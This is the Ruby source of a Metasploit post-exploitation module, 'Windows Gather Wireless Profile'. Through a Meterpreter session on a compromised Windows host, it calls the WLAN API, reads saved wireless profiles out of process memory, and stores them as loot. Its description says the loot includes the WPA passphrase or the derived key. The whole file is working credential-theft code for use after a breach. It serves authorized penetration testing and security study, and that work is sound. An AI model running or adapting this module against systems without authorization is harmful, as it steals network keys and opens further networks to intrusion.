##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/auxiliary/report'

class MetasploitModule < Msf::Post
  include Msf::Auxiliary::Report

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows Gather Wireless Profile',
      'Description'   => %q{
        This module extracts saved Wireless LAN profiles. It will also try to decrypt
        the network key material. Behavior is slightly different between OS versions
        when it comes to WPA. In Windows Vista/7 we will get the passphrase. In
        Windows XP we will get the PBKDF2 derived key.
      },
      'License'       => MSF_LICENSE,
      'Author'        => ['theLightCosine'],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))
  end

  def run
    #Opens memory access into the host process
    mypid = client.sys.process.getpid
    @host_process = client.sys.process.open(mypid, PROCESS_ALL_ACCESS)
    @wlanapi = client.railgun.wlanapi
    wlan_info = "Wireless LAN Profile Information \n"
    wlan_handle = open_handle()
    unless wlan_handle
      print_error("Couldn't open WlanAPI Handle. WLAN API may not be installed on target")
      print_error("On Windows XP this could also mean the Wireless Zero Configuration Service is turned off")
      return
    end
    wlan_iflist = enum_interfaces(wlan_handle)

    if wlan_iflist.empty?
      print_status("No wireless interfaces")
      return
    end

    #Take each enumerated interface and gets the profile information available on each one
    wlan_iflist.each do |interface|
      wlan_profiles = enum_profiles(wlan_handle, interface['guid'])
      guid = guid_to_string(interface['guid'])

      #Store all the information to be saved as loot
      wlan_info << "GUID: #{guid} Description: #{interface['description']} State: #{interface['state']}\n"
      wlan_profiles.each do |profile|
        wlan_info << " Profile Name: #{profile['name']}\n"
        wlan_info  << profile['xml']
      end
    end
    #strip the nullbytes out of the text for safe outputting to loot
    wlan_info.gsub!(/\x00/,"")
    print_good(wlan_info)
    store_loot("host.windows.wlan.profiles", "text/plain", session, wlan_info, "wlan_profiles.txt", "Wireless LAN Profiles")

    #close the Wlan API Handle
    closehandle = @wlanapi.WlanCloseHandle(wlan_handle,nil)
    if closehandle['return'] == 0
      print_status("WlanAPI Handle Closed Successfully")
    else
      print_error("There was an error closing the Handle")
    end
  end


  def open_handle
    begin
      wlhandle = @wlanapi.WlanOpenHandle(2,nil,4,4)
    rescue
      return nil
    end
    return wlhandle['phClientHandle']
  end


  def enum_interfaces(wlan_handle)
    iflist = @wlanapi.WlanEnumInterfaces(wlan_handle,nil,4)
    pointer= iflist['ppInterfaceList']
    numifs = @host_process.memory.read(pointer,4)
    numifs = numifs.unpack("V")[0]
    interfaces = []
    return [] if numifs.nil?

    #Set the pointer ahead to the first element in the array
    pointer = (pointer + 8)
    (1..numifs).each do |i|
      interface = {}
      #Read the GUID (16 bytes)
      interface['guid'] = @host_process.memory.read(pointer,16)
      pointer = (pointer + 16)
      #Read the description(up to 512 bytes)
      interface['description'] = @host_process.memory.read(pointer,512)
      pointer = (pointer + 512)
      #Read the state of the interface (4 bytes)
      state = @host_process.memory.read(pointer,4)
      pointer = (pointer + 4)

      #Turn the state into human readable form
      state = state.unpack("V")[0]
      case state
        when 0
          interface['state'] = "The interface is not ready to operate."
        when 1
          interface['state'] = "The interface is connected to a network."
        when 2
          interface['state'] = "The interface is the first node in an ad hoc network. No peer has connected."
        when 3
          interface['state'] = "The interface is disconnecting from the current network."
        when 4
          interface['state'] = "The interface is not connected to any network."
        when 5
          interface['state'] = "The interface is attempting to associate with a network."
        when 6
          interface['state'] = "Auto configuration is discovering the settings for the network."
        when 7
          interface['state'] = "The interface is in the process of authenticating."
        else
          interface['state'] = "Unknown State"
      end
      interfaces << interface
    end
    return interfaces
  end


  def enum_profiles(wlan_handle,guid)
    profiles=[]
    proflist = @wlanapi.WlanGetProfileList(wlan_handle,guid,nil,4)
    ppointer = proflist['ppProfileList']
    numprofs = @host_process.memory.read(ppointer,4)
    numprofs = numprofs.unpack("V")[0]
    ppointer = (ppointer + 8)
    (1..numprofs).each do |j|
      profile={}
      #Read the profile name (up to 512 bytes)
      profile['name'] = @host_process.memory.read(ppointer,512)
      ppointer = (ppointer + 516)

      rprofile = @wlanapi.WlanGetProfile(wlan_handle,guid,profile['name'],nil,4,4,4)
      xpointer= rprofile['pstrProfileXML']

      #The size  of the XML string is unknown. If we read too far ahead we will cause it to break
      #So we start at 1000bytes and see if the end of the xml is present, if not we read ahead another 100 bytes
      readsz = 1000
      profmem = @host_process.memory.read(xpointer,readsz)
      until profmem[/(\x00){2}/]
        readsz = (readsz + 100)
        profmem = @host_process.memory.read(xpointer,readsz)
      end

      #Slice off any bytes we picked up after the string terminates
      profmem.slice!(profmem.index(/(\x00){2}/), (profmem.length - profmem.index(/(\x00){2}/)))
      profile['xml'] = profmem
      profiles << profile
    end
    return profiles
  end

  #Convert the GUID to human readable form
  def guid_to_string(guid)
    aguid = guid.unpack("H*")[0]
    sguid = "{" + aguid[6,2] + aguid[4,2] + aguid[2,2] + aguid[0,2]
    sguid << "-" + aguid[10,2] +  aguid[8,2] + "-" + aguid[14,2] + aguid[12,2] + "-" +  aguid[16,4]
    sguid << "-" + aguid[20,12] + "}"
    return sguid
  end
end
